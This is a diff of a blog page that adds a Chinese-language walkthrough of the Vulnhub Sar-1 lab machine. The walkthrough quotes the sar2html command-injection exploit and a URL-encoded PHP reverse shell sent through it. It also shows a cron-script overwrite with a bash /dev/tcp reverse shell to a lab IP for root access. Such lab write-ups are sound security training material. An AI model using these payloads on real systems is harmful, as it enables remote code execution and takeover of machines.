@@ -11,7 +11,7 @@
   
   <title>
     
-      archive_a: 2022/7 
+      Vulnhub：Sar-1 
       
       
       |
@@ -117,59 +117,191 @@
 
 
       <div class="flex-container">
-        <!-- 归档页，展示本站所有文章，按照年份降序归类，url形式：https://yoursite/archives/ -->
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
 
-<!-- last: 按年份把文章分组，当前遍历到的年份 -->
-<!-- now: 当前遍历到的文章的发布年份 -->
 
-<div class="container archives">
-  <div class="post-list">
-    
-        <!-- 后续文章的发布年份呈现 -->
-        <div class="content-title">
-          <h2>
-            <span>2022</span>
-          </h2>
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Vulnhub：Sar-1</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-07-21 02:36:36
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E6%B8%97%E9%80%8F/" title="渗透">
+                    <b>#</b> 渗透
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/Vulnhub/" title="Vulnhub">
+                    <b>#</b> Vulnhub
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h3 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集">#</a> 信息收集</h3>
+<p>锁靶机 IP<br>
+<img src="https://img-blog.csdnimg.cn/4d5c1786e5984bfda955d24540679b33.png" alt="在这里插入图片描述"><br>
+只开放了 80 端口<br>
+<img src="https://img-blog.csdnimg.cn/8fecd7dfb15c41d4a2ced1e5c23ac68a.png" alt="在这里插入图片描述"></p>
+<p>目录扫描<br>
+<img src="https://img-blog.csdnimg.cn/f912eb761cf2402dbc853bb534b50909.png" alt="在这里插入图片描述"></p>
+<p>robots.txt 下记录的网址<br>
+<img src="https://img-blog.csdnimg.cn/eb4da7da947340b8b9cb021c303d09c0.png" alt="在这里插入图片描述"><br>
+根据暴露出的信息试着找下有没有 exp</p>
+<p><img src="https://img-blog.csdnimg.cn/a16562de726d4ee292e7c8e0982eae61.png" alt="在这里插入图片描述"><br>
+因为是 php 站点，这里就使用第二个进行测试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">└─# batcat 47204.txt  </span><br><span class="line">───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: 47204.txt</span><br><span class="line">───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ # Exploit Title: sar2html Remote Code Execution</span><br><span class="line">   2   │ # Date: 01/08/2019</span><br><span class="line">   3   │ # Exploit Author: Furkan KAYAPINAR</span><br><span class="line">   4   │ # Vendor Homepage:https://github.com/cemtan/sar2html</span><br><span class="line">   5   │ # Software Link: https://sourceforge.net/projects/sar2html/</span><br><span class="line">   6   │ # Version: 3.2.1</span><br><span class="line">   7   │ # Tested on: Centos 7</span><br><span class="line">   8   │ </span><br><span class="line">   9   │ In web application you will see index.php?plot url extension.</span><br><span class="line">  10   │ </span><br><span class="line">  11   │ http://&lt;ipaddr&gt;/index.php?plot=;&lt;command-here&gt; will execute</span><br><span class="line">  12   │ the command you entered. After command injection press &quot;select # host&quot; then your command&#x27;s</span><br><span class="line">  13   │ output will appear bottom side of the scroll screen.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>访问网站的 index.php 然后传参即可 rce<br>
+<img src="https://img-blog.csdnimg.cn/2f9a00332877473fb1f760658de7dfdc.png" alt="在这里插入图片描述"></p>
+<p>反弹 shell<br>
+ 这里选择 php 反弹 shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.30.136/sar2HTML/index.php?plot=;php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.30.128%22%2C4444%29%3Bexec%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27</span></span><br></pre></td></tr></table></figure>
+<p>url 编码一下<br>
+因为是 ubuntu 的靶机，所有 python 反弹应该也是可以的</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/releases">然后用脚本枚举提权</a><br>
+给一下权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 linpeas.sh</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/3067810c96864cd0a794504db9fe8cf9.png" alt="在这里插入图片描述"><br>
+其中发现一段 sudo 权限<br>
+<img src="https://img-blog.csdnimg.cn/1517267d38e649f3b981c7a48147289b.png" alt="在这里插入图片描述"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat finally.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">./write.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/b76580e64fdc472bbc0f138a2ffe22f3.png" alt="在这里插入图片描述"><br>
+使用计划任务提权<br>
+发现 finally 在以 sudo 的权限运行 write 的脚本<br>
+那这里我们如果重写 write 的内容，就可以尝试反弹一个 root 的 shell</p>
+<p><a target="_blank" rel="noopener" href="http://write.sh">write.sh</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.30.128/5678 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>该脚本位每 5 分钟就执行一次<br>
+<img src="https://img-blog.csdnimg.cn/d915255c3b1048989a2fd1e4eccaebad.png" alt="在这里插入图片描述"><br>
+所以上传完重写的 write 后开个端口监听等着就完事了</p>
+<p>拿到 root 后就 cat root.txt 即可<br>
+这里我一直等不到 shell 出来，就没有截图了</p>
+<p>靶机整体简单，就是   www-data-&gt;root 这里需要理解一下，执行的脚本是绕过了 love 用户直接拿到 root。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/07/20/Zend%20FrameWork%20RCE1/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-07-21 02:36:36
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E6%B8%97%E9%80%8F/" title="渗透">
+                        <b>#</b> 渗透
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/Vulnhub/" title="Vulnhub">
+                        <b>#</b> Vulnhub
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
         </div>
       
-      <div class="post-item" title="Vulnhub：Sar-1">
-        <div class="time-m-d">07-21</div>
-        <div class="title">
-          <a href="/2022/07/21/Vulnhub%EF%BC%9ASar-1/">
-            <span>Vulnhub：Sar-1</span>
-          </a>
-        </div>
-      </div>
+    </div>
     
-      <div class="post-item" title="Zend FrameWork RCE1">
-        <div class="time-m-d">07-20</div>
-        <div class="title">
-          <a href="/2022/07/20/Zend%20FrameWork%20RCE1/">
-            <span>Zend FrameWork RCE1</span>
-          </a>
-        </div>
-      </div>
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text"> 信息收集</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
     
-      <div class="post-item" title="Hello World">
-        <div class="time-m-d">07-17</div>
-        <div class="title">
-          <a href="/2022/07/17/hello-world/">
-            <span>Hello World</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="CommonsCollections1">
-        <div class="time-m-d">02-17</div>
-        <div class="title">
-          <a href="/2022/02/17/CommonsCollections1/">
-            <span>CommonsCollections1</span>
-          </a>
-        </div>
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
       </div>
     
   </div>
-</div>
+
 
         
 <div class="footer">
@@ -441,6 +573,24 @@
 
 
         
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Vulnhub%EF%BC%9ASar-1 + '&url=' + https%3A%2F%2Fki10moc.github.io%2F2022%2F07%2F21%2FVulnhub%25EF%25BC%259ASar-1%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ki10moc.github.io/2022/07/21/Vulnhub%EF%BC%9ASar-1/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
   
   
 <script src="/js/shares.js"></script>
